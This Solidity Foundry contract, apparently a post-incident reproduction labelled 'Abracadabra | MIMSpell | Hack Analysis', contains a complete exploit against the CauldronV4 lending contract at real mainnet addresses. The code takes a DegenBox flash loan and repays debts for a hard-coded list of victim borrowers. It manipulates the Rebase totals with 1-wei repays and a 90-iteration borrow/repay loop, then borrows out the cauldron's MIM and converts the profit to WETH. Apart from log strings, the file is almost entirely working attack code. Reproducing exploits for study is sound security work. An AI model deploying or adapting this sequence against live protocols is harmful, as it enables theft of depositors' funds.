pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function decimals() external view returns (uint8);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;

    function transfer(address _to, uint256 _value) external;
}

interface IFlashBorrower {
    /// @notice The flashloan callback. `amount` + `fee` needs to repayed to msg.sender before this call returns.
    /// @param sender The address of the invoker of this flashloan.
    /// @param token The address of the token that is loaned.
    /// @param amount of the `token` that is loaned.
    /// @param fee The fee that needs to be paid on top for this loan. Needs to be the same as `token`.
    /// @param data Additional data that was passed to the flashloan function.
    function onFlashLoan(
        address sender,
        IERC20 token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IDegenBox {
    function balanceOf(address, address) external view returns (uint256);

    function flashLoan(
        IFlashBorrower borrower,
        address receiver,
        IERC20 token,
        uint256 amount,
        bytes calldata data
    ) external;

    function deposit(
        IERC20 token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);

    function withdraw(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4 {
    struct Rebase {
        uint128 elastic;
        uint128 base;
    }

    function addCollateral(address to, bool skim, uint256 share) external;

    function borrow(
        address to,
        uint256 amount
    ) external returns (uint256 part, uint256 share);

    function repay(
        address to,
        bool skim,
        uint256 part
    ) external returns (uint256 amount);

    function repayForAll(uint128 amount, bool skim) external returns (uint128);

    function userBorrowPart(address) external view returns (uint256);

    function totalBorrow()
        external
        view
        returns (uint128 elastic, uint128 base);
}

interface VyperContract {
    function add_liquidity(
        uint256[3] calldata amounts,
        uint256 min_mint_amount
    ) external;

    function balanceOf(address account) external view returns (uint256);

    function mint(address account, uint256 value) external;

    function approve(address spender, uint256 value) external;

    function transferUnderlyingTo(
        address target,
        uint256 amount
    ) external returns (uint256);

    function deposit(uint256 amounts) external returns (uint256);

    function exchange(
        address _pool,
        address _from,
        address _to,
        uint256 _amount,
        uint256 _expected,
        address _receiver
    ) external returns (uint256);

    function remove_liquidity_one_coin(
        uint256 _token_amount,
        int128 i,
        uint256 min_amount
    ) external;

    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy,
        address _receiver
    ) external returns (uint256);
}

interface UniswapV3Pool {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract AbracadabraExploit is IFlashBorrower, Test {
    event log_string(string);

    address CauldronV4 = 0x7259e152103756e1616A77Ae982353c3751A6a90;
    address MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address DegenBox = 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce;
    address MIMApe = 0xf35b31B941D94B249EaDED041DB1b05b7097fEb6;
    address CurveStableSwap = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    address Curve3Pool = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;
    address CurveLP = 0xc4AD29ba4B3c580e6D59105FFf484999997675Ff;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address yvCurve = 0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3;
    address MIMUSDC = 0x298b7c5e0770D151e4C5CF6cCA4Dae3A3FFc8E27;
    address USDCWETH = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256[] userBorrowPartEach;

    address[] arrayVictim = [
        0x941ec857134B13c255d6EBEeD1623b1904378De9,
        0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2,
        0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc,
        0xc3Be098f9594E57A3e71f485a53d990FE3961fe5,
        0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D,
        0xe435BEbA6DEE3D6F99392ab9568777EB8165719d,
        0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5,
        0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34,
        0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7,
        0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881,
        0x3B473F790818976d207C2AcCdA42cb432b749451,
        0x48ED01117a130b660272228728e07eF9efe21A30,
        0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1,
        0xD24cb02BEd630BAA49887168440D90BE8DA6708c,
        0x0aB7999894F36eDe923278d4E898e78085B289e6,
        0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A
    ];

    function exploit() external {
        emit log_string("=============Abracadabra | MIMSpell | Hack Analysis =============\n");
        emit log_string("===========================");
        
        emit log_named_decimal_uint(
            "Attacker balance before attack - MIM:",
            IERC20(MIM).balanceOf(address(this)),
            IERC20(MIM).decimals()
        );

        emit log_named_decimal_uint(
            "Attacker balance before attack - WETH:",
            IERC20(WETH).balanceOf(address(this)),
            IERC20(WETH).decimals()
        );

        emit log_string("===========================\n");

        _exploit();

        emit log_string("===========================");

        emit log_named_decimal_uint(
            "Attacker balance after attack - MIM:",
            IERC20(MIM).balanceOf(address(this)),
            IERC20(MIM).decimals()
        );

        emit log_named_decimal_uint(
            "Attacker balance after attack - WETH:",
            IERC20(WETH).balanceOf(address(this)),
            IERC20(WETH).decimals()
        );
        emit log_string("===========================\n");
    }

    function _exploit() internal {
        emit log_string("0. Starting Attack");
       
        emit log_string(
            "1. Approved MIM, USDT, CurveLP and yvCurve to 5 contracts"
        );

        IERC20(MIM).approve(DegenBox, 2 ** 256 - 1);
        IERC20(MIM).approve(CurveStableSwap, 2 ** 256 - 1);
        IUSDT(USDT).approve(Curve3Pool, 2 ** 256 - 1);
        VyperContract(CurveLP).approve(yvCurve, 2 ** 256 - 1);
        VyperContract(yvCurve).approve(DegenBox, 2 ** 256 - 1);

        emit log_string("2. Taking Flashloan from DegenBox for 300K MIM");

        IDegenBox(DegenBox).flashLoan(
            IFlashBorrower(address(this)),
            address(this),
            IERC20(MIM),
            300000000000000000000000,
            "0x"
        );

        emit log_string("3. Exchanging Profit MIM to USDC on Curve");
        VyperContract(CurveStableSwap).exchange_underlying(
            0,
            2,
            4300000 * 1e18,
            0,
            address(this)
        );

        emit log_string("4. Swapping MIM for USDC then USDC for WETH from MIMUSDC UniV3 Pool");
        UniswapV3Pool(MIMUSDC).swap(
            address(this),
            true,
            100000 * 1e18,
            75212254740446025735711, //sqrtPriceLimitX96
            ""
        );

        emit log_string("5. Swapping from USDCWETH UniV3 Pool");
        UniswapV3Pool(USDCWETH).swap(
            address(this),
            true,
            int256(IERC20(USDC).balanceOf(address(this))),
            1567565235711739205094520276811199, //sqrtPriceLimitX96
            ""
        );
        emit log_string("6. Completed the attack. \n");
    }

    function onFlashLoan(
        address,
        IERC20,
        uint256,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        IDegenBox(DegenBox).deposit(
            IERC20(MIM),
            address(this),
            DegenBox,
            8894382279231396727995,
            0
        );
        emit log_string("\t 2.1 Deposited MIM in DegenBox");

        IERC20(MIM).transfer(CauldronV4, 240000000000000000000000);

        emit log_string("\t 2.2 Transfered to CauldronV4");

        ICauldronV4(CauldronV4).repayForAll(240000000000000000000000, true);

        emit log_string("\t 2.3 Called RepayForAll to CauldronV3");

        for (uint256 i = 0; i < arrayVictim.length - 1; i++) {
            uint256 temp;
            temp = ICauldronV4(CauldronV4).userBorrowPart(
                payable(arrayVictim[i])
            );
            userBorrowPartEach.push(temp);

            ICauldronV4(CauldronV4).repay(
                arrayVictim[i],
                true,
                userBorrowPartEach[i]
            );
        }
        emit log_string("\t 2.4 Fetched UserBorrowPart and repay() for selectUsers[]");

        ICauldronV4(CauldronV4).totalBorrow();

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            126989589381283599649734
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit log_string("\t 2.5 Repayed for last Victim with part total - 100 to skim Collateral");

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            1
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit log_string("\t ====ACTUAL VULNERABILITY HERE!====");
        emit log_string("\t ===Checking Rebase{base, elastic} to hit {0,x}");

        emit log_string("\t 2.6 Repayed for last Victim with part 1 first");

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            1
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit log_string("\t 2.7 Repayed for last Victim with part 1 second");

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            1
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit log_string("\t 2.8 Repayed for last Victim with part 1 third");

        ICauldronV4(CauldronV4).totalBorrow();
        
        emit log_string("\t ===Checked Rebase{base, elastic} == {0,97}===");

        VyperContract(CurveStableSwap).exchange_underlying(
            0,
            3,
            2000000000000000000000,
            0,
            address(this)
        );
        emit log_string("\t 2.9 Get 2000 USDT for MIM from Curve");

        uint256 ret = IERC20(USDT).balanceOf(address(this));

        uint256[3] memory arrayAddLiq;
        arrayAddLiq[0] = ret;
        arrayAddLiq[1] = 0;
        arrayAddLiq[2] = 0;

        VyperContract(Curve3Pool).add_liquidity(arrayAddLiq, 0);

        emit log_string("\t 2.10 Added exchanged USDT amount as liquidity to Curve3Pool");

        ret = VyperContract(CurveLP).balanceOf(address(this));

        VyperContract(yvCurve).deposit(ret);

        emit log_string("\t 2.11 Deposited LPTokens to yvCurve");

        ret = VyperContract(yvCurve).balanceOf(address(this));

        IDegenBox(DegenBox).deposit(
            IERC20(yvCurve),
            address(this),
            CauldronV4,
            ret,
            0
        );
        emit log_string("\t 2.11 Deposited LPTokens from yvCurve to DegenBox");

        HelperExploitContract helper = new HelperExploitContract();
        emit log_string("\t ===Created Helper contract for exploit===");
        helper.exploit();
        emit log_string("\t 2.12 Looped 90x (borrow and repay)");  

        ICauldronV4(CauldronV4).addCollateral(address(this), true, ret - 100);
        emit log_string("\t 2.13 Added collateral to Cauldron with depositedAmount - 100");

        ret = IDegenBox(DegenBox).balanceOf(MIM, address(CauldronV4));

        ICauldronV4(CauldronV4).borrow(address(this), ret);
        emit log_string(
            "\t 2.14 Borrowed DegenBox LP Balance of Cauldronv4 in MIM"
        );

        ret = IDegenBox(DegenBox).balanceOf(MIM, address(this));

        IDegenBox(DegenBox).withdraw(MIM, address(this), address(this), ret, 0);
        emit log_string(
            "\t 2.15 Withdrawn DegenBox LP Balance of attacker in MIM "
        );

        IERC20(MIM).transfer(address(DegenBox), 300_000 * 1e18 + fee);
        emit log_string(
            "\t 2.16 MIM transferred back to DegenBox for flashloan amount + fee"
        );

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256,
        bytes calldata
    ) external {
        if (msg.sender == MIMUSDC) {
            IERC20(MIM).transfer(MIMUSDC, uint256(amount0Delta));
        } else {
            IERC20(USDC).transfer(USDCWETH, uint256(amount0Delta));
        }
    }
}

contract HelperExploitContract {
    address private constant CauldronV4 =
        0x7259e152103756e1616A77Ae982353c3751A6a90;

    function exploit() external {
        ICauldronV4(CauldronV4).addCollateral(address(this), true, 100);
        ICauldronV4(CauldronV4).borrow(address(this), 1);

        uint8 i;
        while (i < 90) {
            ICauldronV4(CauldronV4).borrow(address(this), 1);
            ICauldronV4(CauldronV4).repay(address(this), true, 1);
            ++i;
        }
        ICauldronV4(CauldronV4).repay(address(this), true, 1);
    }

    receive() external payable {}
}
